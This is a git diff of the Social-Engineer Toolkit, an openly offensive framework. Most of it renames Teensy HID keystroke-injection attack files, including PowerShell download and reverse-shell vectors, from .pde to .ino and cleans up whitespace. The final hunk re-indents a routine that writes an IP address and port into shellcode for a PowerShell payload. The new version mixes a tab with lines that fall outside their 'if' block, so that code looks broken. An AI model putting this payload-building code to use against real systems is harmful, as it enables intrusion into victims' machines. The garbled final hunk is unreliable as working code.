@@ -677,42 +677,42 @@ def teensy_pde_generator(attack_method):
     # if we are doing the attack vector teensy beef
     if attack_method == "beef":
         # specify the filename
-        filename = open("src/teensy/beef.pde", "r")
-        filewrite = open(setdir + "/reports/beef.pde", "w")
+        filename = open("src/teensy/beef.ino", "r")
+        filewrite = open(setdir + "/reports/beef.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))
+            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
-        filename = open("src/teensy/powershell_down.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_down.pde", "w")
+        filename = open("src/teensy/powershell_down.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_down.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
-        filename = open("src/teensy/powershell_reverse.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_reverse.pde", "w")
+        filename = open("src/teensy/powershell_reverse.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_reverse.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
-        filename = open("src/teensy/java_applet.pde", "r")
-        filewrite = open(setdir + "/reports/java_applet.pde", "w")
+        filename = open("src/teensy/java_applet.ino", "r")
+        filewrite = open(setdir + "/reports/java_applet.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
-        filename = open("src/teensy/wscript.pde", "r")
-        filewrite = open(setdir + "/reports/wscript.pde", "w")
+        filename = open("src/teensy/wscript.ino", "r")
+        filewrite = open(setdir + "/reports/wscript.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (setdir))
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
@@ -728,7 +728,7 @@ def teensy_pde_generator(attack_method):
         # specify the filename
         import src.teensy.binary2teensy
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (setdir))
 
     print_status(teensy_string)
 #
@@ -820,8 +820,8 @@ def show_banner(define_version, graphic):
     print(bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
 [---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
-                       Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """                   
-                   Codename: '""" + bcolors.YELLOW + """Recharged""" + bcolors.ENDC + bcolors.BLUE + """'              
+                       Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
+                   Codename: '""" + bcolors.YELLOW + """Recharged""" + bcolors.ENDC + bcolors.BLUE + """'
 [---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
@@ -869,7 +869,7 @@ def show_banner(define_version, graphic):
 
         # If thread is still active
         if p.is_alive():
-            print(bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC) 
+            print(bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC)
             # terminate the process
             p.terminate()
             p.join()
@@ -1063,7 +1063,7 @@ def show_graphic():
            |`;=====' =''     ``=  `-'     `=====''|
            |______________________________________|
 	''')
-    
+
     if menu == 13:
         print(bcolors.RED + r"""
                       ..:::::::::..
@@ -1436,26 +1436,26 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
         # if not "reverse_http" in payload or not "reverse_https" in payload:
         if not "http" in payload:
-            shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
-            # sub in \x for 0x
-            shellcode = re.sub("\\\\x", "0x", shellcode)
-            shellcode = shellcode.replace("\\", "")
-            # base counter
-            counter = 0
-            # count every four characters then trigger floater and write out data
-            floater = ""
-            # ultimate string
-            newdata = ""
-            for line in shellcode:
-                floater = floater + line
-                counter = counter + 1
-                if counter == 4:
-                    newdata = newdata + floater + ","
-                    floater = ""
-                    counter = 0
+	     shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
+        # sub in \x for 0x
+        shellcode = re.sub("\\\\x", "0x", shellcode)
+        shellcode = shellcode.replace("\\", "")
+        # base counter
+        counter = 0
+        # count every four characters then trigger floater and write out data
+        floater = ""
+        # ultimate string
+        newdata = ""
+        for line in shellcode:
+            floater = floater + line
+            counter = counter + 1
+            if counter == 4:
+                newdata = newdata + floater + ","
+                floater = ""
+                counter = 0
 
-            # heres our shellcode prepped and ready to go
-            shellcode = newdata[:-1]
+        # heres our shellcode prepped and ready to go
+        shellcode = newdata[:-1]
 
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
